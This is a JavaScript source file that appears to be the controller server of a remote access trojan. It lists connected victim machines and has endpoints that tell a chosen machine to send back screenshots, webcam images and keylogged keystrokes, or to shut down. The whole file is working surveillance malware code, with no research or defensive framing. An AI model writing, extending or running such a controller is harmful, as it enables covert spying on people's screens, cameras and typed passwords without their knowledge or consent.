const { Tree } = require('./Tree.js')
const { Server } = require("socket.io");
const fs = require('fs')
const express = require('express')
const app = express()

app.use('/docs', (req, res) => {
  const showdown = require('showdown')
  const markdown = new showdown.Converter()
  let md = fs.readFileSync('./readme.md', { encoding: 'utf8' })
  let html = `<body style='overflow:hidden;background: black; color: white;'>
    <div style='font-family: arial;padding:100px;width: 800px;'>${markdown.makeHtml(md)}</div>
  </body>`
  res.set('Content-Type', 'text/html');
  res.end(Buffer.from(html));
})

app.use('/dl', express.static('download'))
app.use('/cdn', express.static('assets'))
app.use('/', express.static('public'))

const server = app.listen(3000)
const io = new Server(server)

let socket_infos = []

function getSocketById(id) {

  let sockets = io.sockets.sockets

  if (sockets.has(id)) {
    return sockets.get(id)
  }

  return false
}

app.use('/sockets', (req, res) => {

  res.set('Content-Type', 'application/json');
  let string = JSON.stringify(socket_infos)
  res.end(Buffer.from(string));

})

app.get('/do/screenshot/:socketId', (req, res) => {

  res.set('Content-Type', 'application/json');
  io.to(req.params.socketId).emit('screen')
  let socket = getSocketById(req.params.socketId)

  if (socket === false) { res.status(400); return }

  socket.on("image", (buffer) => {
    res.end(Buffer.from(JSON.stringify({
      base64: `data:image/png;base64, ${buffer.toString('base64')}`
    })))
  })

})

app.get('/do/webcam/:socketId', (req, res) => {

  res.set('Content-Type', 'application/json');
  io.to(req.params.socketId).emit('cam')
  let socket = getSocketById(req.params.socketId)

  if (socket === false) { res.status(400); return }

  socket.on("image", (buffer) => {
    res.end(Buffer.from(JSON.stringify({
      base64: `data:image/png;base64, ${buffer.toString('base64')}`
    })))
  })

})

app.get('/do/keylog/:socketId', (req, res) => {

  res.set('Content-Type', 'application/json');
  io.to(req.params.socketId).emit('keylog')
  let socket = getSocketById(req.params.socketId)

  if (socket === false) { res.status(400); return }

  socket.on("out_keylog", (array) => {

    res.end(Buffer.from(JSON.stringify({
      rawtext: array.filter(x => x.length === 1 || x === "ENTER" || x === "SPACE").join('').replaceAll('SPACE', " ").replaceAll('ENTER', '\n\n').toLowerCase()
    })))
    
  })

})

app.get('/do/kill/:socketId', (req, res) => {

  let socket = getSocketById(req.params.socketId)
  if (socket === false) { res.status(400); return }
  io.to(req.params.socketId).emit('kill')

})

io.on('connection', socket => {

  if(!socket_infos.find(x => x.id == socket.id)) {
    io.to(socket.id).emit('info')
  }

  socket.on('socket_info', infos => {
    infos.id = socket.id
    socket_infos.push(infos)
  })

  socket.on('disconnect', () => {
    socket_infos.splice(socket_infos.indexOf(socket_infos.find(x => x.id == socket.id)), 1)
  })

})